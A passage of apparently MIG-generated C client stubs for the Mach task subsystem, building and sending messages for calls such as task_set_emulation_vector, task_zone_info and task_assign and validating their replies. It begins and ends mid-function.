#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_set_emulation_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_set_emulation_t__defined */

	__DeclareSendRpc(3424, "task_set_emulation")

	InP->NDR = NDR_record;

	InP->routine_entry_pt = routine_entry_pt;

	InP->routine_number = routine_number;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_port;
	InP->Head.msgh_id = 3424;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3424, "task_set_emulation")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3424, "task_set_emulation")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_set_emulation_t__defined)
	check_result = __MIG_check__Reply__task_set_emulation_t((__Reply__task_set_emulation_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_set_emulation_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_get_emulation_vector_t__defined)
#define __MIG_check__Reply__task_get_emulation_vector_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_get_emulation_vector_t(__Reply__task_get_emulation_vector_t *Out0P)
{

	typedef __Reply__task_get_emulation_vector_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3525) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->emulation_vector.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->emulation_vector.size / 8 != Out0P->emulation_vectorCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_get_emulation_vector_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_get_emulation_vector */
mig_external kern_return_t task_get_emulation_vector
(
	task_t task,
	int *vector_start,
	emulation_vector_t *emulation_vector,
	mach_msg_type_number_t *emulation_vectorCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t emulation_vector;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		int vector_start;
		mach_msg_type_number_t emulation_vectorCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t emulation_vector;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		int vector_start;
		mach_msg_type_number_t emulation_vectorCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_get_emulation_vector_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_get_emulation_vector_t__defined */

	__DeclareSendRpc(3425, "task_get_emulation_vector")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3425;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3425, "task_get_emulation_vector")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3425, "task_get_emulation_vector")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_get_emulation_vector_t__defined)
	check_result = __MIG_check__Reply__task_get_emulation_vector_t((__Reply__task_get_emulation_vector_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_get_emulation_vector_t__defined) */

	*vector_start = Out0P->vector_start;

	*emulation_vector = (emulation_vector_t)(Out0P->emulation_vector.address);
	*emulation_vectorCnt = Out0P->emulation_vectorCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_set_emulation_vector_t__defined)
#define __MIG_check__Reply__task_set_emulation_vector_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_set_emulation_vector_t(__Reply__task_set_emulation_vector_t *Out0P)
{

	typedef __Reply__task_set_emulation_vector_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3526) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_set_emulation_vector_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_set_emulation_vector */
mig_external kern_return_t task_set_emulation_vector
(
	task_t task,
	int vector_start,
	emulation_vector_t emulation_vector,
	mach_msg_type_number_t emulation_vectorCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t emulation_vector;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		int vector_start;
		mach_msg_type_number_t emulation_vectorCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_set_emulation_vector_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_set_emulation_vector_t__defined */

	__DeclareSendRpc(3426, "task_set_emulation_vector")

#if	UseStaticTemplates
	const static mach_msg_ool_descriptor_t emulation_vectorTemplate = {
		/* addr = */		(void *)0,
		/* size = */		0,
		/* deal = */		FALSE,
		/* copy = */		MACH_MSG_VIRTUAL_COPY,
		/* pad2 = */		0,
		/* type = */		MACH_MSG_OOL_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->emulation_vector = emulation_vectorTemplate;
	InP->emulation_vector.address = (void *)(emulation_vector);
	InP->emulation_vector.size = emulation_vectorCnt * 8;
#else	/* UseStaticTemplates */
	InP->emulation_vector.address = (void *)(emulation_vector);
	InP->emulation_vector.size = emulation_vectorCnt * 8;
	InP->emulation_vector.deallocate =  FALSE;
	InP->emulation_vector.copy = MACH_MSG_VIRTUAL_COPY;
	InP->emulation_vector.type = MACH_MSG_OOL_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->vector_start = vector_start;

	InP->emulation_vectorCnt = emulation_vectorCnt;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3426;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3426, "task_set_emulation_vector")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3426, "task_set_emulation_vector")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_set_emulation_vector_t__defined)
	check_result = __MIG_check__Reply__task_set_emulation_vector_t((__Reply__task_set_emulation_vector_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_set_emulation_vector_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_set_ras_pc_t__defined)
#define __MIG_check__Reply__task_set_ras_pc_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_set_ras_pc_t(__Reply__task_set_ras_pc_t *Out0P)
{

	typedef __Reply__task_set_ras_pc_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3527) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_set_ras_pc_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_set_ras_pc */
mig_external kern_return_t task_set_ras_pc
(
	task_t target_task,
	vm_address_t basepc,
	vm_address_t boundspc
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		vm_address_t basepc;
		vm_address_t boundspc;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_set_ras_pc_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_set_ras_pc_t__defined */

	__DeclareSendRpc(3427, "task_set_ras_pc")

	InP->NDR = NDR_record;

	InP->basepc = basepc;

	InP->boundspc = boundspc;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3427;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3427, "task_set_ras_pc")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3427, "task_set_ras_pc")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_set_ras_pc_t__defined)
	check_result = __MIG_check__Reply__task_set_ras_pc_t((__Reply__task_set_ras_pc_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_set_ras_pc_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_zone_info_t__defined)
#define __MIG_check__Reply__task_zone_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_zone_info_t(__Reply__task_zone_info_t *Out0P)
{

	typedef __Reply__task_zone_info_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3528) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 2 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->names.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->info.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->names.size / 80 != Out0P->namesCnt)
		return MIG_TYPE_ERROR;
	if (Out0P->info.size / 88 != Out0P->infoCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_zone_info_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_zone_info */
mig_external kern_return_t task_zone_info
(
	task_inspect_t target_task,
	mach_zone_name_array_t *names,
	mach_msg_type_number_t *namesCnt,
	task_zone_info_array_t *info,
	mach_msg_type_number_t *infoCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t names;
		mach_msg_ool_descriptor_t info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t namesCnt;
		mach_msg_type_number_t infoCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t names;
		mach_msg_ool_descriptor_t info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t namesCnt;
		mach_msg_type_number_t infoCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_zone_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_zone_info_t__defined */

	__DeclareSendRpc(3428, "task_zone_info")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3428;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3428, "task_zone_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3428, "task_zone_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_zone_info_t__defined)
	check_result = __MIG_check__Reply__task_zone_info_t((__Reply__task_zone_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_zone_info_t__defined) */

	*names = (mach_zone_name_array_t)(Out0P->names.address);
	*namesCnt = Out0P->namesCnt;

	*info = (task_zone_info_array_t)(Out0P->info.address);
	*infoCnt = Out0P->infoCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_assign_t__defined)
#define __MIG_check__Reply__task_assign_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_assign_t(__Reply__task_assign_t *Out0P)
{

	typedef __Reply__task_assign_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3529) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_assign_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_assign */
mig_external kern_return_t task_assign
(
	task_t task,
	processor_set_t new_set,
	boolean_t assign_threads
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_set;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		boolean_t assign_threads;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_assign_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_assign_t__defined */

	__DeclareSendRpc(3429, "task_assign")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t new_setTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->new_set = new_setTemplate;
	InP->new_set.name = new_set;
#else	/* UseStaticTemplates */
	InP->new_set.name = new_set;
	InP->new_set.disposition = 19;
	InP->new_set.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->assign_threads = assign_threads;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3429;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3429, "task_assign")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3429, "task_assign")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_assign_t__defined)
	check_result = __MIG_check__Reply__task_assign_t((__Reply__task_assign_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_assign_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_assign_default_t__defined)
#define __MIG_check__Reply__task_assign_default_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_assign_default_t(__Reply__task_assign_default_t *Out0P)
{

	typedef __Reply__task_assign_default_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3530) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_assign_default_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_assign_default */
mig_external kern_return_t task_assign_default
(
	task_t task,
	boolean_t assign_threads
)
{

